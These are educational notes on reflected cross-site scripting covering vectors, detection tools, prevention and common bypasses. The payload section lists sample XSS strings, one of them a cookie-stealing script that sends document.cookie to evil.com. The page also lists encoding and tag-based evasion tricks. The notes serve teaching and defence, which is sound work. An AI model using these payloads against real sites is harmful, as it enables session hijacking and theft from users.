# ğŸš¨ Reflected XSS (Cross-Site Scripting) â€” Complete Notes

## ğŸ§  What is Reflected XSS?

Reflected XSS is a type of vulnerability where **malicious JavaScript is reflected from the server into the user's browser** and executed immediately.

- âŒ Not stored on the server (non-persistent)  
- ğŸ’¥ Triggered by clicking a malicious link  
- ğŸ“ Common in search results, error pages, or form outputs

---

## ğŸ§ª Example Attack

**URL:**


https://example.com/search?q=<script>alert('XSS')</script>


**Rendered HTML:**

```html
<p>Search results for <script>alert('XSS')</script></p>

ğŸ’¥ Result: JavaScript is executed on page load.

ğŸ¯ How Attackers Exploit Reflected XSS
Common Vectors
URL parameters: ?q=, ?search=

Form inputs

HTTP headers like Referer, User-Agent

Payload Examples
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
"><svg/onload=alert(1)>
<script>fetch('http://evil.com?cookie=' + document.cookie)</script>

Attacker Goals
ğŸ¥· Steal session cookies

ğŸ¯ Log keystrokes

ğŸ”€ Redirect users

ğŸ§ª Inject fake forms (phishing)

ğŸ•µï¸â€â™‚ï¸ Perform actions as the user (session hijacking)

ğŸ” How to Detect Reflected XSS
Manual Testing
Input a test payload:

html
Copy
Edit
<script>alert(1)</script>
Check if it gets reflected and executed in the browser.

Tools for Detection
Burp Suite

OWASP ZAP

XSS Hunter

Dalfox

XSStrike

Helpful Browser Extensions
XSS Radar

HackBar

ğŸ”’ How to Prevent Reflected XSS
âœ… Escape Output (Context-Aware)
HTML: &lt;, &gt;, &quot;, &#x27;

JavaScript: properly escape strings

URL: use encodeURIComponent()

âœ… Avoid Raw HTML Injection
Never use innerHTML, document.write(), or template literals with unescaped user input.

âœ… Use a Content Security Policy (CSP)
http
Copy
Edit
Content-Security-Policy: default-src 'self'; script-src 'self';
âœ… Sanitize Input
Use libraries like:

DOMPurify (client-side)

OWASP Java Encoder (server-side)

Microsoft AntiXSS

âœ… Validate Input
Whitelist acceptable characters

Reject or sanitize unexpected input

âœ… Use HTTPOnly Cookies
Prevent JavaScript access to session tokens.

ğŸ”§ How Frontend Frameworks Help (But Be Careful)
Modern frameworks like React, Angular, and Vue auto-escape by default.

âœ… Safe: {userInput} in React

âš ï¸ Dangerous: dangerouslySetInnerHTML, v-html, innerHTML

Always sanitize external content before injecting into the DOM.

ğŸ“Š XSS Types Comparison
Type	Persistent?	Triggered By	Stored on Server?
Reflected	No	Clicking a link	No
Stored	Yes	Viewing the page	Yes
DOM-Based	No	JavaScript in browser	No

ğŸ§  Advanced Bypasses and Obfuscation
Attackers may use:

Encoded payloads: %3Cscript%3E

Event handlers: onmouseover, onerror, etc.

Alternative tags: <svg>, <iframe>, <object>

HTTP parameter pollution

Template injection in server-side rendering

âœ… Defense Checklist
 Escape output based on context (HTML, JS, URL)

 Sanitize inputs with trusted libraries

 Use a strong Content Security Policy

 Apply HTTPOnly and Secure flags on cookies

 Avoid eval(), innerHTML, document.write()

 Donâ€™t reflect user input unless absolutely necessary

 Test regularly with security tools

ğŸ’¡ Quick Test Payload
html
Copy
Edit
"><script>alert('XSS')</script>
Use this on forms, query parameters, and input fields to test for vulnerability.

ğŸ§° Tools & Resources
Testing Tools
Burp Suite

OWASP ZAP

Dalfox

XSStrike

Sanitization Libraries
DOMPurify

JS-XSS

Google Caja (deprecated but informative)

CSP Evaluator
https://csp-evaluator.withgoogle.com

